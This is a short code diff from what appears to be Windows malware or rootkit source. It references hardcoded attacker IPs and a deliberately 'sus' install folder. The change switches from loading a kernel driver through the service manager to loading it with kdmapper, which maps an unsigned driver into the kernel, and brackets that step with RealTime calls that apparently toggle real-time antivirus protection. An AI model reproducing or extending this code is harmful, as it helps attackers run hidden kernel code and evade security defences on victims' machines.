@@ -274,6 +274,7 @@ int main(int argc, char *argv[]) {
     BOOL IsValidPipe = FALSE;
     DWORD LastError = 0;
     LogFile MediumLog = { 0 };
+    RETURN_LAST ReturnStatus = { 0 };
     MediumLog.InitiateFile("C:\\nosusfolder\\verysus\\MediumLogFile.txt");
 
     // HARDCODED VALUE, GENERATED FROM ListAttacker IN trypack\AttackerFile\attackerips.txt
@@ -319,15 +320,20 @@ int main(int argc, char *argv[]) {
 
 
     // Activate service manager with driver as parameter -
-    system("sc stop KmdfDriver");
-    system("sc delete KmdfDriver");
-    if (system("sc create KmdfDriver type= kernel binPath= \"C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys\" && sc start KmdfDriver") == -1) {
-        //if (system("C:\\nosusfolder\\verysus\\kdmapper.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys") == -1) {
+    ReturnStatus = RealTime(TRUE);
+    if (ReturnStatus.Represent != ERROR_SUCCESS || ReturnStatus.LastError != 0) {
+        return FALSE;
+    }
+    if (system("C:\\nosusfolder\\verysus\\kdmapper.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys") == -1) {
         MediumLog.WriteError("MainMedium pipe - Failed to activate service manager with driver as parameter", GetLastError());
         MediumLog.CloseLog();
         return 0;
     }
     MediumLog.WriteLog((PVOID)"Activated service manager with driver as a parameter!\n", 55);
+    ReturnStatus = RealTime(FALSE);
+    if (ReturnStatus.Represent != ERROR_SUCCESS || ReturnStatus.LastError != 0) {
+        return FALSE;
+    }
 
 
     // Create valid pipe for communications initial -
